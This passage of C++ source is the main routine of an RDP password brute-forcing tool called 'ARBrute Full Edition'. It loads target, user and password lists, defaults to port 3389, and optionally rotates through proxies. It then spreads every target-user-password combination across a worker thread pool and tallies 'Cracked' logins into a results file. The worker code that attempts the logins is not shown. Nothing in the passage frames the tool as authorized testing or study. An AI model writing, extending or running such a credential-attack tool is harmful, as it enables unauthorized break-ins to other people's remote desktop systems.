    std::cout << "  - Health Monitor: " << (cfg.enable_health_monitor ? "ON" : "OFF") << "\n";
    std::cout << "  - Watchdog: " << (cfg.enable_watchdog ? "ON" : "OFF") << "\n\n";
    
    // Initialize logger
    g_log = new SafeLogger(cfg.log_file, cfg.output_file, cfg.stats_file, cfg.immediate_hit_flush);
    g_log->log_dbg("=== Starting ARBrute Full Edition ===");
    g_log->log_dbg("Config: threads=" + std::to_string(cfg.threads) + 
                  " timeout=" + std::to_string(cfg.timeout_ms) + "ms");
    
    // Load data files with error handling
    auto target_lines = load_string_list_safe(cfg.targets_file, "targets", false);
    auto users = load_string_list_safe(cfg.users_file, "users", false);
    auto passwords = load_string_list_safe(cfg.pass_file, "passwords", true);  // ✅ EMPTY PASS SUPPORT
    
    if (target_lines.empty() || users.empty() || passwords.empty()) {
        std::cerr << "❌ ERROR: One or more input lists are empty!\n";
        g_log->log_dbg("ERROR: Empty input lists - aborting");
        delete g_log;
        return 1;
    }
    
    // Parse targets into structured format
    std::vector<Target> targets;
    targets.reserve(target_lines.size());
    for (const auto& tl : target_lines) {
        if (tl.find(':') != std::string::npos) {
            size_t p = tl.rfind(':');
            try { 
                targets.emplace_back(tl.substr(0, p), std::stoi(tl.substr(p+1))); 
            } catch (...) { 
                targets.emplace_back(tl, 3389);  // Default RDP port
            }
        } else {
            targets.emplace_back(tl, 3389);
        }
    }
    
    // Load proxies if enabled
    std::vector<ProxyInfo> proxies;
    if (cfg.use_proxy) {
        proxies = load_proxies_safe(cfg.proxy_file);
        g_log->log_dbg("Proxies loaded: " + std::to_string(proxies.size()));
        std::cout << "🔗 Loaded " << proxies.size() << " proxies\n";
    }
    
    // Calculate total tasks with overflow protection
    const uint64_t tc = targets.size();
    const uint64_t uc = users.size();
    const uint64_t pc2 = passwords.size();
    
    if (uc > 0 && pc2 > 0 && tc > UINT64_MAX / (uc * pc2)) {
        std::cerr << "❌ ERROR: Task count would overflow 64-bit integer!\n";
        std::cerr << "   Reduce list sizes or split the job.\n";
        g_log->log_dbg("ERROR: Task overflow - aborting");
        delete g_log;
        return 1;
    }
    
    const uint64_t total_tasks = tc * uc * pc2;
    
    // Estimate memory usage (rough calculation)
    size_t mem_est = (tc * 30) + (uc * 25) + (pc2 * 30) + (proxies.size() * 50);
    
    // Log job summary
    g_log->log_dbg("=== Job Summary ===");
    g_log->log_dbg("Targets: " + std::to_string(tc));
    g_log->log_dbg("Users:   " + std::to_string(uc));
    g_log->log_dbg("Passes:  " + std::to_string(pc2) + " (incl. empty)");
    g_log->log_dbg("Total tasks: " + std::to_string(total_tasks));
    g_log->log_dbg("Est. RAM: ~" + std::to_string(mem_est / 1024) + " KB");
    
    // Display summary to user
    std::cout << "\n╔════════════════════════════════════════════════════╗\n";
    std::cout << "║  📊 Job Summary                                    ║\n";
    std::cout << "╠════════════════════════════════════════════════════╣\n";
    std::cout << "║  Targets: " << std::setw(10) << tc << "                        ║\n";
    std::cout << "║  Users:   " << std::setw(10) << uc << "                        ║\n";
    std::cout << "║  Passes:  " << std::setw(10) << pc2 << "                        ║\n";
    std::cout << "║  Tasks:   " << std::setw(10) << total_tasks << "                      ║\n";
    std::cout << "║  RAM Est: ~" << std::setw(6) << (mem_est/1024) << " KB                       ║\n";
    std::cout << "║  Threads: " << std::setw(10) << cfg.threads << "                        ║\n";
    std::cout << "╚════════════════════════════════════════════════════╝\n\n";
    
    std::cout << "🚀 Starting " << cfg.threads << " worker threads...\n\n";
    
    // Setup watchdogs for each thread
    std::vector<ThreadWatchdog*> watchdogs;
    watchdogs.reserve(cfg.threads);
    for (int i = 0; i < cfg.threads; i++) {
        watchdogs.push_back(new ThreadWatchdog(i));
    }
    
    // Start monitoring threads
    std::thread monitor;
    std::thread status;
    
    if (cfg.enable_health_monitor) {
        monitor = std::thread(health_monitor, std::ref(watchdogs));
    }
    if (cfg.enable_status_bar) {
        status = std::thread(status_bar_thread);
    }
    
    // Atomic task index for lock-free distribution
    std::atomic<uint64_t> task_idx{0};
    
    // Launch worker thread pool
    std::vector<std::thread> pool;
    pool.reserve(cfg.threads);
    for (int i = 0; i < cfg.threads; i++) {
        pool.emplace_back(worker_thread,
                         std::cref(targets),
                         std::cref(users),
                         std::cref(passwords),
                         cfg.use_proxy ? &proxies : nullptr,
                         std::ref(task_idx),
                         total_tasks,
                         i);
    }
    
    // Main wait loop - monitor progress until all tasks complete
    while (active_threads.load(std::memory_order_acquire) > 0) {
        Sleep(500);
    }
    
    // Graceful shutdown sequence
    g_running.store(false, std::memory_order_release);
    
    // Wait for monitoring threads
    if (monitor.joinable()) monitor.join();
    if (status.joinable()) status.join();
    
    // Wait for all worker threads
    for (auto& th : pool) {
        if (th.joinable()) th.join();
    }
    
    // Cleanup watchdogs
    for (auto* wd : watchdogs) delete wd;
    
    // Final report
    time_t end_time = time(nullptr);
    time_t start = start_time.load(std::memory_order_relaxed);
    double total_sec = (end_time - start) > 0 ? (end_time - start) : 1;
    
    std::cout << "\n\n╔════════════════════════════════════════════════════╗\n";
    std::cout << "║              ✅ TEST COMPLETE                        ║\n";
    std::cout << "╠════════════════════════════════════════════════════╣\n";
    std::cout << "║  Duration:  " << std::setw(10) << (int)(total_sec/60) << "m " << (int)std::fmod(total_sec,60) << "s                  ║\n";
    std::cout << "║  Checked:   " << std::setw(12) << stats_checked.load() << "                  ║\n";
    std::cout << "║  Cracked:   " << std::setw(12) << stats_cracked.load() << "                  ║\n";
    std::cout << "║  Failed:    " << std::setw(12) << stats_failed.load() << "                  ║\n";
    std::cout << "║  Errors:    " << std::setw(12) << stats_errors.load() << "                  ║\n";
    std::cout << "║  Timeouts:  " << std::setw(12) << stats_timeouts.load() << "                  ║\n";
    std::cout << "║  Avg PPS:   " << std::setw(12) << (int)(stats_checked.load()/total_sec) << "                  ║\n";
    std::cout << "║  Avg CPS:   " << std::setw(12) << (int)(stats_cracked.load()/total_sec) << "                  ║\n";
    std::cout << "╠════════════════════════════════════════════════════╣\n";
    std::cout << "║  Results:   " << std::setw(12) << cfg.output_file << "                     ║\n";
    std::cout << "║  Debug:     " << std::setw(12) << cfg.log_file << "                     ║\n";
    std::cout << "║  Stats:     " << std::setw(12) << cfg.stats_file << "                     ║\n";
    std::cout << "╚════════════════════════════════════════════════════╝\n";
    
    // Export final stats to JSON
    export_stats_json(cfg.stats_file);
    
    // Final log entry
    if (g_log) {
        g_log->log_dbg("=== Test Complete ===");
        g_log->log_dbg("Duration: " + std::to_string((int)(total_sec/60)) + "m " + 
                      std::to_string((int)std::fmod(total_sec,60)) + "s");
        g_log->log_dbg("Checked:" + std::to_string(stats_checked.load()) +
                      " | Cracked:" + std::to_string(stats_cracked.load()) +
                      " | Failed:" + std::to_string(stats_failed.load()) +
                      " | Errors:" + std::to_string(stats_errors.load()));
        delete g_log;
    }
    
    // Final cleanup
    timeEndPeriod(1);
    WSACleanup();
    
    std::cout << "\n✨ Exit: Clean ✓\n";
    std::cout << "Press Enter to exit...";
    std::cin.ignore();
    std::cin.get();
    
    return 0;
}